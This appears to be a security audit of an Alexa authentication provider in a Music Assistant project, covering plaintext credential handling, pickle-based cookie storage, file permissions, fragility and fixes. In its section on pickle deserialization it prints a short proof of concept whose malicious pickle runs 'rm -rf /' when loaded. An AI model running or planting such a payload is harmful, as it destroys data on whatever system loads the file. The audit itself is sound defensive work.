# Alexa Authentication Deep Code Analysis
**Project**: MusicAssistantApple
**Date**: 2025-10-25
**Status**: CRITICAL - Multiple Security and Fragility Concerns Identified

---

## Executive Summary

The Alexa provider authentication implementation in Music Assistant exhibits **severe security vulnerabilities** and **architectural fragility**. The system relies on the `alexapy` library (v1.29.5), which uses **unofficial Amazon APIs** and employs **insecure credential storage** practices. This analysis identifies 8 critical security issues, 6 major fragility points, and recommends immediate remediation.

**Risk Level**: 🔴 **HIGH** - Production use not recommended without significant security hardening

---

## 1. Authentication Flow Architecture

### 1.1 High-Level Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          USER INITIATES AUTH                             │
│                    (Click "Authenticate" button)                         │
└──────────────────────────┬──────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────────┐
│               MUSIC ASSISTANT CONFIG FLOW                                │
│  - Collect: amazon.com URL, email, password, OTP secret                 │
│  - Trigger: CONF_ACTION_AUTH action                                     │
└──────────────────────────┬──────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                    AuthenticationHelper Setup                            │
│  - Generate unique session_id                                           │
│  - Create callback endpoint: /callback/{session_id}                     │
│  - Callback URL: http://localhost/callback/{session_id}                 │
└──────────────────────────┬──────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                      AlexaLogin Instance                                 │
│  - url: "amazon.com" (or regional variant)                              │
│  - email: user_email                                                    │
│  - password: user_password (PLAINTEXT IN MEMORY) ⚠️                     │
│  - otp_secret: TOTP secret (PLAINTEXT IN MEMORY) ⚠️                     │
│  - outputpath: lambda function (cookie file path builder)               │
└──────────────────────────┬──────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                      AlexaProxy Setup                                    │
│  - proxy_path: /alexa/auth/proxy/                                       │
│  - post_path: /alexa/auth/proxy/ap/signin/*                             │
│  - proxy_url: http://{base_url}/alexa/auth/proxy/                       │
│  - Registers TWO dynamic routes on webserver                            │
└──────────────────────────┬──────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────────┐
│              PROXY AUTHENTICATION PROCESS                                │
│  1. AlexaProxy.all_handler() intercepts ALL requests to proxy paths     │
│  2. Forwards requests to Amazon login servers                           │
│  3. Handles CAPTCHA, 2FA, and other auth challenges                     │
│  4. Amazon cookies set in aiohttp.ClientSession                         │
│  5. On success: "Successfully logged in" text detected                  │
└──────────────────────────┬──────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                    SUCCESS DETECTION                                     │
│  - Check response text for "Successfully logged in"                     │
│  - Trigger callback: GET {callback_url}                                 │
│  - Display HTML: "Login successful! Close this window"                  │
└──────────────────────────┬──────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                    TOKEN VALIDATION                                      │
│  - Call: await login.test_loggedin()                                    │
│  - Validates session cookies with Amazon API                            │
│  - Returns: True if authenticated, False otherwise                      │
└──────────────────────────┬──────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                    COOKIE PERSISTENCE                                    │
│  - Directory: {storage_path}/.alexa/                                    │
│  - Filename: alexa_media.{username}.pickle                              │
│  - Format: Python pickle (aiohttp.CookieJar) ⚠️ INSECURE              │
│  - Permissions: Default filesystem (potentially world-readable) ⚠️      │
└──────────────────────────┬──────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────────┐
│                    CLEANUP AND FINALIZATION                              │
│  - Unregister dynamic proxy routes                                      │
│  - Close AuthenticationHelper context                                   │
│  - AlexaLogin object stored in provider instance                        │
└──────────────────────────┬──────────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────────┐
│              SUBSEQUENT SESSIONS (loaded_in_mass)                        │
│  - Load cookie from pickle file: login.load_cookie()                    │
│  - Call: await login.login(cookies=loaded_cookies)                      │
│  - If cookies valid: Skip re-authentication                             │
│  - If cookies expired: User must re-authenticate manually               │
└─────────────────────────────────────────────────────────────────────────┘
```

### 1.2 Detailed Authentication Steps

#### Step 1: Configuration Collection
```python
# File: alexa/__init__.py:65-202
async def get_config_entries(...):
    # Collect:
    - CONF_URL: Amazon domain (amazon.com, amazon.co.uk, etc.)
    - CONF_USERNAME: Email address
    - CONF_PASSWORD: Password (marked as SECURE_STRING but stored in memory)
    - CONF_AUTH_SECRET: OTP secret for 2FA (optional, SECURE_STRING)
    - CONF_API_URL: External API for media playback (default: http://localhost:3000)
    - CONF_API_BASIC_AUTH_USERNAME/PASSWORD: For external API
```

**Security Note**: While `ConfigEntryType.SECURE_STRING` is used, this only affects UI display. Credentials are still **plaintext in memory** and passed directly to alexapy.

#### Step 2: Proxy-Based Authentication
```python
# File: alexa/__init__.py:80-141
if action == CONF_ACTION_AUTH:
    # Create AlexaLogin with credentials
    login = AlexaLogin(
        url=str(values[CONF_URL]),
        email=str(values[CONF_USERNAME]),
        password=str(values[CONF_PASSWORD]),  # ⚠️ PLAINTEXT
        otp_secret=str(values.get(CONF_AUTH_SECRET, "")),  # ⚠️ PLAINTEXT
        outputpath=lambda x: x,
    )

    # Setup proxy infrastructure
    proxy_path = "/alexa/auth/proxy/"
    proxy_url = f"{base_url}{proxy_path}"
    proxy = AlexaProxy(login, proxy_url)

    # Register DYNAMIC routes (security risk - see below)
    mass.webserver.register_dynamic_route(proxy_path, proxy_handler, "GET")
    mass.webserver.register_dynamic_route(post_path, proxy_handler, "POST")
```

**Fragility Point**: Dynamic route registration during auth creates race conditions and cleanup issues.

#### Step 3: Cookie Persistence
```python
# File: alexa/__init__.py:205-226
async def save_cookie(login: AlexaLogin, username: str, mass: MusicAssistant):
    cookie_dir = os.path.join(mass.storage_path, ".alexa")
    cookie_path = os.path.join(cookie_dir, f"alexa_media.{username}.pickle")

    # ⚠️ CRITICAL: Pickle format (deserialize = code execution risk)
    cookie_jar = login._session.cookie_jar
    await asyncio.to_thread(cookie_jar.save, login._cookiefile[0])
```

**Security Note**: Python pickle is **inherently insecure** - malicious pickle files can execute arbitrary code.

---

## 2. Security Issues

### 🔴 CRITICAL Security Vulnerabilities

#### 2.1 Plaintext Credential Storage in Memory
**Severity**: CRITICAL
**Location**: `alexa/__init__.py:82-86`

**Issue**:
- User passwords and OTP secrets are stored as **plaintext strings** in `AlexaLogin` objects
- These objects persist in memory for the entire provider lifetime
- No secure memory wiping after authentication
- Memory dumps would expose credentials

**Evidence**:
```python
login = AlexaLogin(
    password=str(values[CONF_PASSWORD]),      # Plaintext
    otp_secret=str(values.get(CONF_AUTH_SECRET, "")),  # Plaintext TOTP seed
)
```

**Attack Vectors**:
1. Process memory dumps (crash dumps, debuggers)
2. Swap file exposure if memory is paged to disk
3. Container/VM snapshots
4. Log file leakage if debug mode enabled

**Impact**: Full account compromise including 2FA bypass (OTP secret = infinite valid codes)

---

#### 2.2 Insecure Cookie Serialization (Pickle Format)
**Severity**: CRITICAL
**Location**: `alexa/__init__.py:218-223`

**Issue**:
- Cookies are serialized using Python's `pickle` module
- Pickle deserialization = **arbitrary code execution** if file is tampered
- No integrity checks (HMAC, signatures) on pickle files
- Cookie files stored with predictable filenames

**Evidence**:
```python
cookie_path = os.path.join(cookie_dir, f"alexa_media.{username}.pickle")
await asyncio.to_thread(cookie_jar.save, login._cookiefile[0])  # Pickle format
```

**Attack Vectors**:
1. Local attacker modifies `.alexa/*.pickle` file
2. Next time provider loads: `login.load_cookie()` deserializes malicious pickle
3. **Result**: Remote Code Execution (RCE) with Music Assistant privileges

**Proof of Concept**:
```python
# Malicious pickle that executes 'rm -rf /' on deserialization
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('rm -rf /',))

with open('alexa_media.victim@example.com.pickle', 'wb') as f:
    pickle.dump(Exploit(), f)
```

---

#### 2.3 Inadequate File Permissions on Cookie Files
**Severity**: HIGH
**Location**: `alexa/__init__.py:211-213`

**Issue**:
- Cookie directory created with `os.makedirs(exist_ok=True)` - **no explicit permissions**
- Default umask applies (typically 0022 = world-readable)
- Cookie files may be readable by other users on multi-user systems

**Evidence**:
```python
cookie_dir = os.path.join(mass.storage_path, ".alexa")
await asyncio.to_thread(os.makedirs, cookie_dir, exist_ok=True)
# ⚠️ No mode=0o700 parameter
```

**Attack Vectors**:
1. Other users on same system read cookie files
2. Shared hosting environments
3. Docker containers with volume mounts

**Impact**: Session hijacking, unauthorized access to Amazon account

---

#### 2.4 No Cookie Encryption at Rest
**Severity**: HIGH
**Location**: `alexa/__init__.py:205-226`

**Issue**:
- Cookies stored in **plaintext pickle** files
- No encryption (AES, ChaCha20, etc.)
- No use of system keyring/keychain
- Session cookies = long-term access credentials

**Evidence**:
```python
# No encryption layer - direct pickle save
await asyncio.to_thread(cookie_jar.save, login._cookiefile[0])
```

**Impact**:
- File theft = account access until cookies expire
- Backup systems may inadvertently copy sensitive cookies
- Cloud sync (if storage path is synced) exposes cookies

---

#### 2.5 Direct Access to Private Attributes
**Severity**: MEDIUM
**Location**: `alexa/__init__.py:207, 214-215, 218-219`

**Issue**:
- Code directly accesses `login._session`, `login._cookiefile`, `login._debug`, `login._outputpath`
- Private attributes (`_` prefix) = no API contract, can break without notice
- Indicates tight coupling to `alexapy` internals

**Evidence**:
```python
if login._session is None:  # ⚠️ Accessing private attribute
    _LOGGER.error("AlexaLogin session is not initialized.")

login._cookiefile = [login._outputpath(cookie_path)]  # ⚠️ Direct assignment
```

**Impact**:
- Breaks when `alexapy` refactors internal structure
- No type safety or validation
- Difficult to mock for testing

---

#### 2.6 No Token Expiration Handling
**Severity**: MEDIUM
**Location**: `alexa/__init__.py:267-283`

**Issue**:
- Provider loads cookies on startup: `await self.login.login(cookies=await self.login.load_cookie())`
- **No automatic token refresh** mechanism
- If cookies expire during runtime → silent failure or errors
- Users must manually re-authenticate

**Evidence**:
```python
async def loaded_in_mass(self):
    # Load cookies, but no refresh logic
    await self.login.login(cookies=await self.login.load_cookie())

    devices = await AlexaAPI.get_devices(self.login)
    if devices is None:  # ⚠️ Silent failure if auth expired
        return
```

**Impact**:
- Intermittent failures (works until cookies expire)
- Poor user experience (random "device unavailable" errors)
- No proactive refresh = users unaware of auth issues

---

#### 2.7 Overly Permissive Error Handling
**Severity**: MEDIUM
**Location**: `alexa/__init__.py:134-138`

**Issue**:
- Bare `except KeyError` catches URL parameter absence
- Generic `except Exception` swallows all errors
- Root cause information lost
- Makes debugging impossible

**Evidence**:
```python
try:
    await auth_helper.authenticate(proxy_url)
    # ... validation ...
except KeyError:
    # "user probably cancelled" - assumes KeyError = cancellation
    pass  # ⚠️ Silent failure
except Exception as error:
    raise LoginFailed(f"Failed to authenticate with Amazon '{error}'.")
    # ⚠️ Loses stack trace, error type info
```

**Impact**:
- Network errors misdiagnosed
- Real issues masked as "user cancellation"
- Support tickets difficult to resolve

---

#### 2.8 External API Dependency (Unclear Trust Boundary)
**Severity**: MEDIUM
**Location**: `alexa/__init__.py:400-418`

**Issue**:
- Media playback requires **external API** (`CONF_API_URL`, default: `http://localhost:3000`)
- **HTTP** (not HTTPS) to localhost
- BasicAuth credentials sent in clear if API requires auth
- No validation of API endpoint origin

**Evidence**:
```python
async with session.post(
    f"{self.config.get_value(CONF_API_URL)}/ma/push-url",
    json={"streamUrl": media.uri},
    timeout=aiohttp.ClientTimeout(total=10),
    auth=auth,  # BasicAuth over HTTP
) as resp:
    await resp.text()
```

**Attack Vectors**:
1. If `CONF_API_URL` is misconfigured to external host → credentials sent over internet
2. Man-in-the-middle on local network (ARP poisoning)
3. Malicious API endpoint logs credentials

**Impact**: Credential interception, unauthorized media playback

---

### 🟡 Security Concerns (Lower Priority)

#### 2.9 Hardcoded Localhost Assumption
- Default `CONF_API_URL = "http://localhost:3000"` assumes single-machine deployment
- Breaks in containerized/distributed deployments
- No mDNS/service discovery

#### 2.10 No Rate Limiting
- `play_media()` has 10s timeout but no retry backoff
- Could trigger Amazon API rate limits
- No circuit breaker pattern

---

## 3. Fragility Points (Likely to Break)

### 🔧 HIGH Fragility Issues

#### 3.1 Dependency on Unofficial Amazon API
**Severity**: CRITICAL
**Source**: `alexapy` library documentation

**Issue**:
> "Alexa has no official API; therefore, this library may stop working at any time without warning."

**Evidence from Web Research**:
- GitHub Issues show **frequent breakage** with Amazon changes
- Cookie format changes break authentication (Issues #2418, #2469, #2427)
- Regional differences (amazon.co.uk vs amazon.com) cause failures
- Amazon A/B testing breaks auth for subsets of users

**Recent Breakages**:
1. **Home Assistant 2024.8.0**: aiohttp version bump broke cookie handling
2. **European Amazon servers**: Cookie partition changes required workarounds
3. **CAPTCHA changes**: New CAPTCHA types not supported (Issue #807)

**Impact**:
- **NO GUARANTEES** this code will work tomorrow
- Amazon can (and does) break it without notice
- Maintenance burden extremely high

---

#### 3.2 Fragile Success Detection (String Matching)
**Severity**: HIGH
**Location**: `alexa/__init__.py:103`

**Issue**:
- Success detection relies on **hardcoded string**: `"Successfully logged in"`
- If Amazon changes login page text → authentication silently fails
- No fallback detection mechanism

**Evidence**:
```python
async def proxy_handler(request: web.Request) -> Any:
    response = await proxy.all_handler(request)
    if "Successfully logged in" in getattr(response, "text", ""):
        # ⚠️ Fragile string matching
```

**Failure Scenarios**:
1. Amazon localizes string to different languages
2. HTML structure changes (string not in `response.text`)
3. JavaScript renders success message (not in initial HTML)

---

#### 3.3 Dynamic Route Registration During Auth
**Severity**: HIGH
**Location**: `alexa/__init__.py:122-124, 140-141`

**Issue**:
- Routes registered **only during auth**, unregistered after
- Race conditions if multiple users authenticate simultaneously
- Cleanup in `finally` block may fail if exception during unregister

**Evidence**:
```python
try:
    mass.webserver.register_dynamic_route(proxy_path, proxy_handler, "GET")
    mass.webserver.register_dynamic_route(post_path, proxy_handler, "POST")
    # ... auth process ...
finally:
    mass.webserver.unregister_dynamic_route(proxy_path, "GET")
    mass.webserver.unregister_dynamic_route(post_path, "POST")
    # ⚠️ If this fails, routes leak
```

**Impact**:
- Route conflicts if re-registering
- Memory leaks (handlers not garbage collected)
- Security issue if old handlers remain accessible

---

#### 3.4 AlexaPy Version Pinning (1.29.5)
**Severity**: MEDIUM
**Location**: `manifest.json:8`

**Issue**:
- Hard dependency: `"alexapy==1.29.5"`
- No version range (e.g., `>=1.29.5,<2.0`)
- Missing security patches in newer versions
- Breaks if package is yanked from PyPI

**Evidence**:
```json
"requirements": ["alexapy==1.29.5"]
```

**Web Research Finding**:
- Issue #2799: Users reported `alexapy==1.29.5` not found on PyPI temporarily
- Version 1.28.2 had CAPTCHA validation bug (Issue #2418)
- Rapid version churn indicates instability

---

#### 3.5 Cookie Compatibility Issues (aiohttp ↔ httpx)
**Severity**: MEDIUM
**Source**: Web research (GitHub issues)

**Issue**:
- `alexapy` had to **patch aiohttp** for non-standard Amazon cookies
- Cookie jar conversion between aiohttp ↔ httpx is fragile
- Python version upgrades break cookie handling

**Evidence**:
> "Aiohttp didn't handle non-spec Amazon responses with cookies"
> "Cookie partition issue requires reloading integration after startup"

**Impact**: Authentication succeeds but cookies don't work for API calls

---

#### 3.6 OTP Secret Handling Assumptions
**Severity**: MEDIUM
**Location**: `alexa/__init__.py:86`

**Issue**:
- OTP secret is **optional** but no validation of format
- Assumes TOTP (not HOTP or other 2FA methods)
- No feedback if OTP secret is invalid

**Evidence**:
```python
otp_secret=str(values.get(CONF_AUTH_SECRET, "")),  # Empty string if missing
```

**Failure Scenarios**:
- User provides HOTP secret → fails silently
- Invalid base32 encoding → crashes during auth
- Amazon switches to push-based 2FA → cannot automate

---

## 4. Integration Pain Points

### 4.1 Provider Lifecycle Issues

**Problem**: Two-phase initialization creates state management complexity

**Current Flow**:
```python
1. __init__() → Provider created (AlexaLogin NOT created yet)
2. loaded_in_mass() → AlexaLogin created, cookies loaded, devices fetched
```

**Pain Points**:
- If `loaded_in_mass()` fails → provider in inconsistent state
- No health check to validate auth is still valid
- Device list fetched once at startup (static, no polling)

---

### 4.2 Music Assistant's Provider System Constraints

**Issue**: Provider must implement player control commands but has limited control over authentication lifecycle

**Commands Implemented**:
```python
cmd_stop(), cmd_play(), cmd_pause(), cmd_volume_set(), cmd_volume_mute()
```

**Problem**:
- Each command creates new `AlexaAPI(device_object, self.login)`
- If `self.login` is invalid (expired cookies) → silent failures
- No retry logic or auth refresh in command handlers

**Example Failure Path**:
```python
async def cmd_play(self, player_id: str):
    api = AlexaAPI(device_object, self.login)
    await api.play()  # ⚠️ Fails if login expired, no error handling
```

---

### 4.3 External API Dependency for Media Playback

**Architecture**:
```
Music Assistant → HTTP POST → External API (port 3000) → Alexa Device
                   {"streamUrl": "..."}
```

**Pain Points**:
1. **Single Point of Failure**: If external API is down → no playback
2. **Network Dependency**: 10s timeout, no retry
3. **Unclear Ownership**: Who maintains this API? Not documented
4. **Security**: HTTP basic auth over local network

**Code**:
```python
async with session.post(
    f"{self.config.get_value(CONF_API_URL)}/ma/push-url",
    json={"streamUrl": media.uri},
    timeout=aiohttp.ClientTimeout(total=10),
    auth=auth,
) as resp:
    await resp.text()
```

---

### 4.4 Device Discovery Limitations

**Issue**: Devices discovered only at startup

**Code**:
```python
async def loaded_in_mass(self):
    devices = await AlexaAPI.get_devices(self.login)
    for device in devices:
        if device.get("capabilities") and "MUSIC_SKILL" in device.get("capabilities"):
            # Register player
```

**Pain Points**:
- New Alexa devices require provider restart to detect
- Removed devices remain as "unavailable" players
- No periodic refresh or webhook for device changes

---

## 5. Configuration & Debugging Issues

### 5.1 Limited Debugging Capabilities

**Issue**: Minimal logging, no debug mode config

**Current Logging**:
```python
_LOGGER.info("Alexa Callback URL: %s", auth_helper.callback_url)  # Only 1 log in auth flow
_LOGGER.debug("Removing outdated cookiefile %s", ...)  # Hidden unless debug enabled
_LOGGER.error("AlexaLogin session is not initialized.")  # No actionable info
```

**Missing**:
- Request/response logging for AlexaAPI calls
- Cookie expiration warnings
- Auth state transitions
- Detailed error messages (current: "please provide logs to discussion #431" 🤦)

---

### 5.2 Configuration Complexity

**User Must Provide**:
1. Correct Amazon domain (`amazon.com`, `amazon.co.uk`, `amazon.de`, etc.)
2. Email and password
3. **OTP secret** (requires extracting from authenticator app)
4. External API URL and credentials (not documented why this is needed)

**No Validation**:
- Wrong domain → auth fails with cryptic error
- Invalid OTP secret → may succeed auth but fail later
- External API unreachable → silent playback failures

---

### 5.3 Error Message Quality

**Current Error Messages**:
```python
raise LoginFailed("Authentication login failed, please provide logs to the discussion #431.")
# ⚠️ Directs users to GitHub discussion instead of providing useful info

raise LoginFailed(f"Failed to authenticate with Amazon '{error}'.")
# ⚠️ Only shows error message, not type or stack trace
```

**Better Approach**:
- Detect specific error types (network, credentials, 2FA)
- Provide actionable remediation steps
- Log full exception with `_LOGGER.exception()`

---

## 6. Code Quality Assessment

### 6.1 Code Organization: 🟡 FAIR

**Positives**:
✅ Clear separation of config flow vs. provider logic
✅ Uses Music Assistant's `AuthenticationHelper` abstraction
✅ Async/await consistently used

**Negatives**:
❌ 438 lines in single file (no modularization)
❌ Config entry function mixes auth logic with UI definitions
❌ No separate auth module or class

---

### 6.2 Error Handling: 🔴 POOR

**Issues**:
- Bare `except KeyError` without explaining what key is missing
- Generic `except Exception` loses error context
- Silent failures (`if devices is None: return`)
- No retry logic for transient errors

**Example of Poor Error Handling**:
```python
try:
    await asyncio.to_thread(cookie_jar.save, login._cookiefile[0])
except (OSError, EOFError, TypeError, AttributeError):
    _LOGGER.debug("Error saving pickled cookie to %s", login._cookiefile[0])
    # ⚠️ Four different exception types, same vague error message
```

---

### 6.3 Type Safety: 🟡 FAIR

**Positives**:
✅ Type hints on function signatures
✅ Uses `TYPE_CHECKING` to avoid circular imports

**Negatives**:
❌ Casts to `str()` without validation (e.g., `str(values[CONF_URL])`)
❌ Direct attribute access without type checking (`device.get("capabilities")`)
❌ `Any` return type on `proxy_handler`

---

### 6.4 Testing: 🔴 CRITICAL GAP

**Found**:
- NO unit tests in `tests/providers/alexa/` (directory doesn't exist)
- No mocking of `alexapy` library
- No integration tests for auth flow

**Implications**:
- Cannot validate auth changes without live Amazon account
- Refactoring extremely risky
- Breaking changes undetected until production

---

### 6.5 Documentation: 🔴 POOR

**Missing**:
- No docstrings on `save_cookie()`, `delete_cookie()`
- No explanation of external API requirement
- No architecture diagram or auth flow documentation
- Comment directing users to "discussion #431" instead of inline help

**Existing**:
- Manifest points to: https://www.music-assistant.io/player-support/alexa/
- TODO: Verify if this page exists and has auth troubleshooting

---

## 7. Dependency Analysis: alexapy Library

### 7.1 Library Maturity: ⚠️ IMMATURE

**Version**: 1.29.5 (as of 2025-10-25)
**Maintainer**: alandtse (GitHub)
**Status**: Active but volatile (frequent breaking changes)

**Red Flags**:
- **No Official API**: Reverse-engineered Amazon endpoints
- **Frequent Breakage**: 50+ GitHub issues related to auth failures
- **Cookie Hacks**: Had to patch aiohttp for non-standard Amazon cookies
- **Regional Issues**: Different behaviors across Amazon domains

---

### 7.2 Security Posture of alexapy

**Concerns**:
1. **Unofficial Library**: No security audits
2. **Pickle Usage**: Internally uses pickle for cookies (as seen in code)
3. **Private API Calls**: No guarantee of encryption, rate limiting, etc.
4. **No CVE Database**: Not tracked by security vulnerability databases

---

### 7.3 Maintenance Risk

**Observations**:
- Single maintainer (alandtse)
- Used primarily by Home Assistant integration
- Breaking changes in minor versions (1.28.2 → 1.29.5 had auth changes)

**Mitigation**:
- Pin version (already done: `==1.29.5`)
- Monitor GitHub issues for breakage reports
- Have fallback plan if library is abandoned

---

## 8. Architectural Recommendations

### 8.1 IMMEDIATE (Critical Security Fixes)

#### 8.1.1 Replace Pickle with Secure Storage
**Priority**: 🔴 CRITICAL

**Current**:
```python
await asyncio.to_thread(cookie_jar.save, login._cookiefile[0])  # Pickle
```

**Recommended**:
```python
# Use cryptography.fernet for encrypted JSON storage
from cryptography.fernet import Fernet
import json

# Generate key from system keyring or config (NOT hardcoded)
key = get_encryption_key_from_keyring()
fernet = Fernet(key)

# Serialize cookies to JSON
cookie_data = {
    'cookies': [
        {'name': c.key, 'value': c.value, 'domain': c['domain'], ...}
        for c in cookie_jar
    ]
}
encrypted = fernet.encrypt(json.dumps(cookie_data).encode())

# Save encrypted data
with open(cookie_path, 'wb') as f:
    f.write(encrypted)
```

**Benefits**:
- Eliminates RCE vulnerability
- Encrypts cookies at rest
- Human-readable format (JSON) for debugging

---

#### 8.1.2 Implement Proper File Permissions
**Priority**: 🔴 CRITICAL

**Current**:
```python
await asyncio.to_thread(os.makedirs, cookie_dir, exist_ok=True)
```

**Recommended**:
```python
# Create directory with restrictive permissions
await asyncio.to_thread(os.makedirs, cookie_dir, mode=0o700, exist_ok=True)

# Set file permissions explicitly
async def save_cookie_secure(cookie_path, data):
    # Write to temp file first
    temp_path = f"{cookie_path}.tmp"
    async with aiofiles.open(temp_path, 'wb') as f:
        await f.write(data)

    # Set restrictive permissions (owner read/write only)
    os.chmod(temp_path, 0o600)

    # Atomic rename
    os.rename(temp_path, cookie_path)
```

---

#### 8.1.3 Clear Credentials from Memory
**Priority**: 🟡 HIGH

**Recommended**:
```python
# After successful auth, wipe credentials
import ctypes

def secure_delete(s: str):
    """Overwrite string in memory before deletion."""
    if s:
        strlen = len(s)
        offset = sys.getsizeof(s) - strlen - 1
        ctypes.memset(id(s) + offset, 0, strlen)

# After auth:
password = values[CONF_PASSWORD]
# ... use password ...
secure_delete(password)
del password
```

**Note**: Python strings are immutable, so this is limited. Better: Use `getpass` module or OS keyring.

---

### 8.2 SHORT-TERM (Reliability Improvements)

#### 8.2.1 Implement Token Refresh Logic
**Priority**: 🟡 HIGH

**Recommended**:
```python
async def ensure_authenticated(self):
    """Ensure login is valid, refresh if needed."""
    if not await self.login.test_loggedin():
        _LOGGER.info("Session expired, attempting to refresh...")

        # Try loading cookies and re-login
        cookies = await self.login.load_cookie()
        await self.login.login(cookies=cookies)

        if not await self.login.test_loggedin():
            # Cookies expired, need user re-auth
            raise LoginFailed("Session expired, please re-authenticate")

# Call before each API operation:
async def cmd_play(self, player_id: str):
    await self.ensure_authenticated()
    api = AlexaAPI(device_object, self.login)
    await api.play()
```

---

#### 8.2.2 Add Robust Error Handling
**Priority**: 🟡 HIGH

**Recommended**:
```python
try:
    await auth_helper.authenticate(proxy_url)
    if await login.test_loggedin():
        await save_cookie(login, username, mass)
    else:
        raise LoginFailed("Authentication succeeded but session validation failed")

except asyncio.TimeoutError:
    raise LoginFailed("Authentication timed out - please try again") from None

except aiohttp.ClientError as err:
    raise LoginFailed(f"Network error during authentication: {err}") from err

except Exception as err:
    _LOGGER.exception("Unexpected error during Alexa authentication")
    raise LoginFailed(
        f"Authentication failed: {type(err).__name__}. "
        f"Check logs for details or visit "
        f"https://music-assistant.io/troubleshooting/alexa-auth"
    ) from err
```

---

#### 8.2.3 Validate Configuration Inputs
**Priority**: 🟢 MEDIUM

**Recommended**:
```python
# Validate Amazon domain
VALID_DOMAINS = ['amazon.com', 'amazon.co.uk', 'amazon.de', 'amazon.fr', ...]
if values[CONF_URL] not in VALID_DOMAINS:
    raise ValueError(f"Invalid Amazon domain. Must be one of: {', '.join(VALID_DOMAINS)}")

# Validate OTP secret format (base32)
import base64
if values.get(CONF_AUTH_SECRET):
    try:
        base64.b32decode(values[CONF_AUTH_SECRET])
    except Exception:
        raise ValueError("OTP secret must be valid base32 encoding")
```

---

### 8.3 LONG-TERM (Architectural Refactoring)

#### 8.3.1 Abstract Authentication Layer
**Priority**: 🟢 MEDIUM

**Recommended**:
```python
# Create separate auth module: alexa/auth.py

class AlexaAuthManager:
    """Manages Alexa authentication lifecycle."""

    async def authenticate(self, email, password, otp_secret=None) -> AlexaSession:
        """Perform initial authentication."""
        pass

    async def refresh_session(self, session: AlexaSession) -> AlexaSession:
        """Refresh expired session."""
        pass

    async def save_session(self, session: AlexaSession):
        """Persist session securely."""
        pass

    async def load_session(self) -> AlexaSession | None:
        """Load persisted session."""
        pass

    async def validate_session(self, session: AlexaSession) -> bool:
        """Check if session is still valid."""
        pass
```

---

#### 8.3.2 Decouple from alexapy Internals
**Priority**: 🟢 MEDIUM

**Current Problem**: Direct access to `login._session`, `login._cookiefile`, etc.

**Recommended**:
- Create wrapper class around `AlexaLogin`
- Expose only public methods
- Handle version changes in wrapper

---

#### 8.3.3 Add Comprehensive Testing
**Priority**: 🟡 HIGH

**Recommended**:
```python
# tests/providers/alexa/test_auth.py

@pytest.mark.asyncio
async def test_save_cookie_creates_secure_directory(tmp_path):
    """Test cookie directory has 0700 permissions."""
    auth = AlexaAuthManager(storage_path=tmp_path)
    await auth.save_session(mock_session)

    cookie_dir = tmp_path / ".alexa"
    assert cookie_dir.exists()
    assert oct(cookie_dir.stat().st_mode)[-3:] == "700"

@pytest.mark.asyncio
async def test_cookie_encryption():
    """Test cookies are encrypted at rest."""
    # Create mock session
    # Save to disk
    # Read raw file - should NOT contain plaintext cookie values
```

---

## 9. Comparison with Industry Standards

### 9.1 OAuth2 Standard Comparison

**Industry Standard (OAuth2)**:
```
1. Redirect user to provider's auth page
2. User authenticates on provider's domain (secure)
3. Provider redirects back with authorization code
4. Exchange code for access token + refresh token
5. Store refresh token securely (encrypted)
6. Use access token for API calls (short-lived)
7. Refresh access token when expired (automatic)
```

**Current Alexa Implementation**:
```
1. Collect username/password directly (⚠️ violates OAuth2)
2. Proxy login through Music Assistant server (⚠️ credentials pass through MA)
3. Store cookies in pickle file (⚠️ no encryption)
4. No token refresh mechanism (⚠️ manual re-auth required)
```

**Gaps**:
- ❌ Credentials handled by client (should be provider-only)
- ❌ No separation of access token vs. refresh token
- ❌ No automatic token refresh
- ❌ No token expiration metadata

---

### 9.2 Spotify Provider Comparison

**Note**: This is hypothetical - would need to examine Music Assistant's Spotify provider for actual comparison

**Expected Best Practices**:
- Uses official Spotify OAuth2 API
- Stores refresh tokens in encrypted format
- Automatic token refresh before API calls
- Graceful degradation if auth fails

**Recommendation**: Audit Spotify/Tidal providers in Music Assistant as reference implementations

---

## 10. Migration Path (If Refactoring)

### Phase 1: Security Hardening (Week 1-2)
1. Replace pickle with encrypted JSON storage
2. Fix file permissions (0700 for dir, 0600 for files)
3. Add input validation for config entries
4. Improve error messages and logging

### Phase 2: Reliability (Week 3-4)
1. Implement token refresh logic
2. Add retry mechanisms with exponential backoff
3. Create health check for auth status
4. Add periodic device discovery

### Phase 3: Testing & Documentation (Week 5-6)
1. Create unit tests with mocked alexapy
2. Add integration tests (if possible with test Amazon account)
3. Write comprehensive troubleshooting guide
4. Create architecture diagram

### Phase 4: Architectural Refactor (Month 2-3)
1. Extract auth logic to separate module
2. Create abstraction layer over alexapy
3. Implement circuit breaker pattern
4. Add telemetry/metrics for auth failures

---

## 11. Immediate Action Items

### For Users (Mitigation Strategies)

1. **Restrict File Permissions** (Manual Fix):
   ```bash
   chmod 700 ~/.local/share/music_assistant/.alexa
   chmod 600 ~/.local/share/music_assistant/.alexa/*.pickle
   ```

2. **Use Dedicated Amazon Account**:
   - Create separate Amazon account for Music Assistant
   - Limit payment methods / address info
   - Enable 2FA with dedicated TOTP secret

3. **Monitor for Unusual Activity**:
   - Check Amazon account activity regularly
   - Watch for unauthorized Alexa commands
   - Enable Amazon login notifications

4. **Network Isolation**:
   - Run Music Assistant in isolated VLAN if possible
   - Block Music Assistant container from internet except Amazon domains

---

### For Developers (Priority Fixes)

1. **CRITICAL** (Deploy ASAP):
   - [ ] Replace pickle with encrypted JSON storage
   - [ ] Fix file permissions (0700/0600)
   - [ ] Add try-except around cookie deserialization

2. **HIGH** (Next Release):
   - [ ] Implement token refresh logic
   - [ ] Add configuration validation
   - [ ] Improve error messages

